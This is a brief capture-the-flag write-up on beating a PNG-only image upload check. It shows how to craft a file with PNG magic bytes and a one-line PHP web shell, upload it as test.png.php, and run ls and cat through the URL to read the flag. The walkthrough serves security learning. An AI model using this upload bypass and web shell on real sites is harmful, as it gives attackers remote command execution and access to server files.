# Problem
I found a web app that processes images: PNG images only!

# Solution
Add `robots.txt` to the URL; you will see `instructions.txt` there, which suggests that the site checks for `.png` extensions and PNG magic bytes (`50 4E 47`). Let's build a PHP payload accordingly (you can use "Wappalyzer" to check the backend architecture).

You can use any editor (e.g., nano, mousepad); I am using gedit:
```bash
gedit test.png.php
```
Put this code inside to gain navigation access through the URL:
```php
PNG
<?php system($_GET['cmd']); ?>
```

Note: You might not see the file when opening the upload dialog. Make sure to change the file type filter to show all files.

After the file has been successfully uploaded, add `/uploads/test.png.php?cmd=ls` in url to list all the files in that directory.  
Move into the parent directory with `/uploads/test.png.php?cmd=ls ..`, where you will see a gibberish file (`GNTDOMBWGIZDE.txt`). This is our flag; let's extract it.

You can use either:
```
/uploads/test.png.php?cmd=cat ../GNTDOMBWGIZDE.txt
```
or
```
/uploads/test.png.php?cmd=cat ../*
```
